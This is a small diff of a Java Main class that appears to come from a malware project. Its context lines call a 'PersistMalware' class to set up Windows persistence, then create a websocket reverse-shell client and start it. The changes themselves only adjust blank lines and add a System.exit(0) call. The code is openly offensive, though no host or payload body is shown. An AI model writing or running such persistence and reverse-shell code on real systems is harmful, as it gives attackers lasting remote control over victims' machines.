@@ -20,12 +20,15 @@ public class Main {
         PersistMalware persistMalware = new PersistMalware();
         System.out.println(persistMalware.createPersistenceWindows());
 
-
-
 //        start reverse shell
+
         WebsocketReverseShellService reverseShell= new ReverseShell();
         reverseShell.createClient();
         reverseShell.startReverseShell();
+
+        System.exit(0);
+
+
     }
 
 
